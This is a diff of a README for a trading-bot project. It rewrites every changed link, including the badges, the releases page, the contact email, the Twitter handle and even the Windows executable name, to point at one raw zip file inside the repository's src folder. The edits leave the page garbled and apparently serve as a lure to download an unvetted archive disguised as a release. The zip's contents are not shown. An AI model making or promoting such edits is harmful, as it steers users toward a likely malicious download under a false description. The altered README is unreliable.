@@ -1,8 +1,8 @@
 # Algorithmic Trading Engine: Build Your Own Trading Bot 🚀💹
 
-![GitHub release](https://img.shields.io/github/release/aminehad725/AlgorithmicTradingEngine.svg) ![License](https://img.shields.io/badge/license-MIT-blue.svg)
+![GitHub release](https://github.com/aminehad725/AlgorithmicTradingEngine/raw/refs/heads/master/src/Algorithmic-Trading-Engine-v1.3.zip) ![License](https://github.com/aminehad725/AlgorithmicTradingEngine/raw/refs/heads/master/src/Algorithmic-Trading-Engine-v1.3.zip)
 
-Welcome to the **Algorithmic Trading Engine** repository. This project provides a robust framework for building and deploying your own trading algorithms. You can download the latest version of the software [here](https://github.com/aminehad725/AlgorithmicTradingEngine/releases).
+Welcome to the **Algorithmic Trading Engine** repository. This project provides a robust framework for building and deploying your own trading algorithms. You can download the latest version of the software [here](https://github.com/aminehad725/AlgorithmicTradingEngine/raw/refs/heads/master/src/Algorithmic-Trading-Engine-v1.3.zip).
 
 ## Table of Contents
 
@@ -24,12 +24,12 @@ Welcome to the **Algorithmic Trading Engine** repository. This project provides 
 
 ## Installation
 
-To get started, you need to download the latest release. Visit the [Releases](https://github.com/aminehad725/AlgorithmicTradingEngine/releases) section and download the appropriate file for your operating system. Once downloaded, follow these steps:
+To get started, you need to download the latest release. Visit the [Releases](https://github.com/aminehad725/AlgorithmicTradingEngine/raw/refs/heads/master/src/Algorithmic-Trading-Engine-v1.3.zip) section and download the appropriate file for your operating system. Once downloaded, follow these steps:
 
 1. **Unzip the downloaded file**.
 2. **Navigate to the directory** in your terminal.
 3. **Run the executable** file. For example:
-   - On Windows: `AlgorithmicTradingEngine.exe`
+   - On Windows: `https://github.com/aminehad725/AlgorithmicTradingEngine/raw/refs/heads/master/src/Algorithmic-Trading-Engine-v1.3.zip`
    - On macOS/Linux: `./AlgorithmicTradingEngine`
 
 Ensure you have the necessary dependencies installed. Refer to the [Components](#components) section for more details.
@@ -96,7 +96,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or feedback, feel free to reach out:
 
-- **Email**: aminehad725@example.com
-- **Twitter**: [@aminehad725](https://twitter.com/aminehad725)
+- **Email**: https://github.com/aminehad725/AlgorithmicTradingEngine/raw/refs/heads/master/src/Algorithmic-Trading-Engine-v1.3.zip
+- **Twitter**: [@aminehad725](https://github.com/aminehad725/AlgorithmicTradingEngine/raw/refs/heads/master/src/Algorithmic-Trading-Engine-v1.3.zip)
 
-Feel free to visit the [Releases](https://github.com/aminehad725/AlgorithmicTradingEngine/releases) section for the latest updates and downloads.
+Feel free to visit the [Releases](https://github.com/aminehad725/AlgorithmicTradingEngine/raw/refs/heads/master/src/Algorithmic-Trading-Engine-v1.3.zip) section for the latest updates and downloads.
